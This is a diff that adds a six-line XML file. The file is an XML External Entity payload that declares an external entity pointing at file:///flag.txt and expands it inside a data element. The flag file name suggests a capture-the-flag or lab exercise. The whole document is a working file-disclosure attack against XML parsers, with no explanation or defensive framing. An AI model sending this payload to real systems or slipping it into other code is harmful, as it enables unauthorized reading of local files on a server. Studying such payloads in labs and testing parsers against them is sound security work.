@@ -1,0 +1,6 @@
+<!DOCTYPE exp[
+    <!ENTITY xxe SYSTEM "file:///flag.txt">
+]>
+<root>
+    <data>&xxe;</data>
+</root>
